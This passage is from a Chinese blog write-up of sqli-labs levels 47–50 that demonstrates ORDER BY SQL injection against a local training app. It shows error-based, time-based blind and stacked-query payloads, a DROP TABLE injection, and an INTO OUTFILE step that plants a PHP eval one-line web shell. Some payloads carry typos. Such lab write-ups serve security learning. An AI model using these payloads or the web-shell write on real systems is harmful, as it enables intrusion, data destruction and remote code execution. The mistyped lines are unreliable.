<p>可以看到 user()的内容， 同时可以构造其他的语句进行注入。<br>这里再放一个报错注入， 原理和上面的 payload 是一样的， 都是利用的 mysql <strong>重复项</strong>的原理。<code>http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20(select%20*%20from%20(select%20NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+</code>此处重复了 <code>version()</code>,所以就爆出了版本号  </p>
<p><strong>③延时注入</strong><br><code>http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20If(ascii(substr(database(),1,1))=115,0,sleep(5))--+</code><br>这里因 database()为 security， 所以第一个字母的 s 的 ascii 为 115， 此处直接显示， 当改为116 或者其他的数字的时候， 就要延时了， 我们这里就不贴图展示了， 可以通过脚本爆破。  </p>
<p><strong>（2） procedure analyse 参数后注入</strong><br>利用 procedure analyse 参数， 我们可以执行报错注入。 同时， 在 procedure analyse 和 order by 之间可以存在 limit 参数， 我们在实际应用中， 往往也可能会存在 limit 后的注入， 可以利用 procedure analyse 进行注入。</p>
<p><code>http://127.0.0.1/sqli-labs/Less-47/?sort=1%27procedure%20analyse(extractvalue(rand(),concat (0x3a,version())),1)--+  </code>  </p>
<p><strong>（4） 导入导出文件 into outfile 参数</strong>  </p>
<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>报错注入不能使用， 不进行错误回显  ,我们使用时间注入，可以利用 sort=rand(true/false)进行判断  </p>
<p><code>http://127.0.0.1/sqli-labs/Less-48/?sort=rand(ascii(left(database(),1))=178)  </code></p>
<p><strong>And 后的延时注入</strong><br><code>http://127.0.0.1/sqli-labs/Less-48/?sort=1%20and%20(If(ascii(substr(database(),1,1))=115,0,sleep(5)))  </code></p>
<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>本关与 47 关基本类似， 区别在于没有错误回显， 所以我们可以通过延时注入和导入文件进行注入。</p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在less46- 49关中，我们通过对order by存在的注入部分进行了简单的分析，我们思考在这几关卡中能有其他的方法吗?</span><br><span class="line">1.我们利用在less45关写一句话的方法，类比将查询结果写到一个文件中:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-49&#x2F;?sort&#x3D;0&#39; into outfile &#39;C:lphpstudy\PHPTutoralAWWW\crow.txt’ --+</span><br><span class="line">2.我们写一句话木马:</span><br><span class="line">php-句话木马: &lt;?php @eval($_ POST&#39;crow]); ?&gt;</span><br><span class="line">绝对路径: C:\phpstudy\PHPTutoriaNWWW\</span><br><span class="line">使用函数: select Xx into outfile xxx</span><br><span class="line">select &#39;&lt;?php @eval(S_ POST[crow]);?&gt;&#39; into utfile C:\pstudy\PHPTutoriaNWWW\crow.pbp&#39;(不要直接复制，自己照</span><br><span class="line">着打)</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less- 49&#x2F;?sort&#x3D;0 and (select ‘&lt;php @eval($_POST[‘crow’];?&gt;’) into  outile C:\phpstudy\PHPTutorialNWWW\crow.php’ -+ (注意这个地方是有括号的， 他和以前的不一样)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>执行 sql 语句我们这里使用的是 <code>mysqli_multi_query()</code>函数， 而之前我们使用的是<code> mysqli_query()</code>， 区别在于 <code>mysqli_multi_query()</code>可以执行多个 sql 语句， 而 <code>mysqli_query()</code>只能执行一个 sql 语句， 那么我们此处就可以执行多个 sql 语句进行注入， 也就是我们之前提到的<code> statcked injection</code>。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入: </span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">我们直接看源码中的sql语句  SEL ECT * FROM users ORDER BY 1</span><br><span class="line">这个貌似和前面的都是相同的，但是我们通过源码观察可知:</span><br><span class="line">在本关中使用了mysgli multi guery()函数 (https:&#x2F;&#x2F;www.runoob.com&#x2F;php&#x2F;func-mysqli-multi-query.html)</span><br><span class="line">而在less46-49关中使用了mysqL fetch_assoc()函数(https:&#x2F;&#x2F;www.runoob.com&#x2F;php&#x2F;func-myslifetch-assoc.html)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以这里的不同点就在于本关可以使用<strong>堆叠注入</strong>的形式，我们可以使用以下几种方法:</p>
<p><strong>基于时间的盲注</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-50&#x2F;?sort&#x3D;1 and if ( (length(database()&gt;1) ,1, sleep(5) )-+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>基于报错往入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-50&#x2F;?sort&#x3D;1 and updatexml( 1, concat(0x7e, (database()) ) ,1) -+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>写一句话木马</strong></p>
<p><strong>使用迭代注入创建删除一个表</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less 50&#x2F;?sort&#x3D;1; create table crow like users; +</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less -50&#x2F;?sort&#x3D;1; drop table crow;-+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>使用对叠注入写一句话木马(</strong></p>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	<span id="/2020/07/13/sqlo-labs/" class="leancloud-visitors view" data-flag-title="SQL注入">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2020/07/14/XSS综合学习/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2019/10/14/分治算法/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">留言</h2>

    
</section>

-->
	
		<section id="comments" class="comments">
			<style>
			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
			</style>
			<div id="vcomment" class="comment"></div>
<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var valineConfig = {"enable":true,"appId":"xx","appKey":"xx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
valineConfig.el='#vcomment';
new Valine(valineConfig);
    // new Valine({
    //     el: '#vcomment',
    //     appId: "",
    //     appKey: "",
    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
    //     avatar:"monsterid",
    //     visitor: "true",
    //     requiredFields: "nick,mail".split(','),
    // });
</script>

		</section>
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2020-07-13 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/SQL注入/">SQL注入<span>2</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/SQL注入/">SQL注入<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%89%8D%E5%A5%8F"><span class="toc-article-text">前奏</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%A6%82%E4%BD%95%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF"><span class="toc-article-text">如何报错信息</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95%E8%AF%AD%E5%8F%A5"><span class="toc-article-text">尝试语句</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-article-text">方法总结</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#sql%E8%AF%AD%E5%8F%A5%E7%9A%84%E5%86%99%E6%B3%95"><span class="toc-article-text">sql语句的写法</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-article-text">查询语句</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E5%85%85"><span class="toc-article-text">知识点补充</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Less-5"><span class="toc-article-text">Less-5</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Less-7"><span class="toc-article-text">Less-7</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-8"><span class="toc-article-text">Less-8</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-17"><span class="toc-article-text">Less-17</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Page-1"><span class="toc-article-text">Page-1</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-1-GET-Error-based-Single-quotes-String"><span class="toc-article-text">Less-1: GET-Error based-Single quotes-String</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less2%EF%BC%9AGET-Error-based-Intiger-based"><span class="toc-article-text">Less2：GET-Error based-Intiger based</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-3-GET-Error-based-Singer-quote-with-twist-string"><span class="toc-article-text">Less-3:GET-Error based-Singer quote with twist-string</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-4-GET-Error-based-Double-Quotes-String"><span class="toc-article-text">Less -4 GET. Error based -Double Quotes -String</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-5-%EF%BC%9AGET-Double-Injection-Single-Quotes-String"><span class="toc-article-text">Less-5 ：GET-Double Injection-Single Quotes-String</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less7-GET-Dump-into-outile-String"><span class="toc-article-text">Less7-GET -Dump into outile -String</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less8-GET-Blind-Boolian-Based-Single-Quotes"><span class="toc-article-text">Less8-GET - Blind - Boolian Based - Single Quotes</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-9%EF%BC%9AGET-Blind-Time-based-Single-Quotes"><span class="toc-article-text">Less-9：GET - Blind - Time based. - Single Quotes</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-10-GET-Blind-Time-based-double-quotes"><span class="toc-article-text">Less-10:GET-Blind - Time based -double quotes</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-11-%EF%BC%9APOST-Error-Based-Single-quotes-String"><span class="toc-article-text">Less-11 ：POST -Error Based - Single quotes- String</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Les-12%EF%BC%9A-POST-Error-Based-Double-quotes-String-with-twist"><span class="toc-article-text">Les-12：. POST - Error Based - Double quotes- String - with twist</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-13%EF%BC%9APOST-Double-Injection-Single-quotes-Strinq-with-twist"><span class="toc-article-text">Less-13：POST- Double Injection - Single quotes- Strinq -with twist</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-14-POST-Double-Injection-Single-quotes-String-with-twist"><span class="toc-article-text">Less-14  POST -Double Injection- Single quotes String -with twist</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less15-POST-Blind-Boolian-time-Based-Single-quotes"><span class="toc-article-text">Less15-POST -Blind- Boolian&#x2F;time Based - Single quotes</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-18-POST-Header-Injection-Uagent-field-Error-based"><span class="toc-article-text">Less-18:POST-Header Injection - Uagent field - Error based</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-19%EF%BC%9APOST-Header-Injection-Referer-field-Error-based-A"><span class="toc-article-text">Less-19：POST-Header Injection -Referer field -Error based A</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less20%EF%BC%9APOST-Cookie-injections-Uagent-field-error-based"><span class="toc-article-text">Less20：POST - Cookie injections - Uagent field - error based.</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-21%EF%BC%9APOST-Dump-into-outfile-String"><span class="toc-article-text">Less-21：POST- Dump into outfile - String</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-22%EF%BC%9AFuture-Editions"><span class="toc-article-text">Less-22：Future Editions</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-23-GET-Error-based-strip-comments"><span class="toc-article-text">Less-23: GET Error based strip comments</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#sql-%E8%AF%AD%E5%8F%A5%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F"><span class="toc-article-text">sql 语句解析顺序</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-24-POST-Second-Oder-Injections-Real-treat-Stored-Injections"><span class="toc-article-text">Less-24: POST- Second Oder Injections Real treat - Stored Injections</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-25-GET-Error-based-All-your-OR-amp-AND-belong-to-us-string-single-quote"><span class="toc-article-text">Less-25: GET- Error based - All your OR &amp; AND belong to us -string single quote</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-25a-GET-Blind-Based-All-your-OR-amp-AND-belong-to-us-Intiger-based"><span class="toc-article-text">Less-25a : GET - Blind Based - All your OR &amp; AND belong to us-Intiger based</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-26-GET-Error-based-All-your-SPACES-and-COMMENTS-belong-to-us"><span class="toc-article-text">Less-26: GET - Error based - All your SPACES and COMMENTS belong to us</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-26A-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-String-single-quotes-Parenthesis"><span class="toc-article-text">Less-26A: GET -Blind Based - All your SPACES and COMMENTS belong to us-String-single quotes-Parenthesis</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-27-GET-Error-Based-All-your-UNION-amp-SELECT-Belong-to-us-String-Single-quote-A"><span class="toc-article-text">Less-27: GET- Error Based-All your UNION &amp; SELECT Belong to us - String -Single quote A</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-27a-A-GET-Blind-Based-All-your-UNION-amp-SELECT-Belong-to-us-Double-Quotes"><span class="toc-article-text">Less-27a: . A GET -Blind Based- All your UNION &amp; SELECT Belong to us - Double Quotes</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-28%EF%BC%9AGET-Error-Based-All-your-UNION-amp-SELECT-Belong-to-us-String-Single-quote-with-parenthesis"><span class="toc-article-text">Less-28：GET -Error Based- All your UNION &amp; SELECT Belong to us - String -Single quote with parenthesis</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-28a%EF%BC%9A-GET-Blind-Based-All-your-UNION-amp-SELECT-Belong-to-us-single-quote-parenthesis"><span class="toc-article-text">Less-28a： GET - Blind Based- All your UNION &amp; SELECT Belong to us-single quote-parenthesis</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-29-GET-Error-based-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application"><span class="toc-article-text">Less-29: GET-Error based-IMPIDENCE MISMATCH- Having a WAF in front of web application.</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-30-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application"><span class="toc-article-text">Less-30: GET - BLIND - IMPIDENCE MISMATCH- Having a WAF in front of web application.</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-31-GET-BLIND-IMPIDENCE-MISMATCH-Having-a-WAF-in-front-of-web-application"><span class="toc-article-text">Less-31: GET-BLIND -IMPIDENCE MISMATCH- Having a WAF in front of web application</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-32-GET-Bypass-custom-filter-adding-slashes-to-dangerous-chars"><span class="toc-article-text">Less-32:GET - Bypass custom filter adding slashes to dangerous chars.</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-33-GET-Bypass-Addslashes"><span class="toc-article-text">Less-33: GET - Bypass Addslashes()</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-34-POST-Bypass-AddSlashes"><span class="toc-article-text">Less-34: POST - Bypass AddSlashes()</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-35-GET-Bypass-Add-Slashes-we-dont-need-them-Integer-based"><span class="toc-article-text">Less-35:GET - Bypass Add Slashes (we dont need them) Integer based</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-36-%EF%BC%9A-GET-Bypass-MysQL-real-escape-string"><span class="toc-article-text">Less-36 ：  GET -Bypass MysQL real escape string</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-37-POST-Bypass-MysQL-real-escape-string"><span class="toc-article-text">Less-37: POST- Bypass MysQL real escape string</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-article-text">总结</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Page3-Stacked-injection"><span class="toc-article-text">Page3  Stacked injection</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-38%EF%BC%9A-Future-Editions"><span class="toc-article-text">Less-38： Future Editions</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-39-GET-Stacked-Query-Injection-Intiger-based"><span class="toc-article-text">Less-39: .GET - Stacked Query Injection- Intiger based</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-40"><span class="toc-article-text">Less-40</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-41"><span class="toc-article-text">Less-41</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-42"><span class="toc-article-text">Less-42</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-43"><span class="toc-article-text">Less-43</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-44"><span class="toc-article-text">Less-44</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-45"><span class="toc-article-text">Less-45</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-article-text">总结_堆叠注入写一句话木马</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-46"><span class="toc-article-text">Less-46</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-47"><span class="toc-article-text">Less-47</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-48"><span class="toc-article-text">Less-48</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-49"><span class="toc-article-text">Less-49</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-article-text">总结</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Less-50"><span class="toc-article-text">Less-50</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2020 西伯利亚狼's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
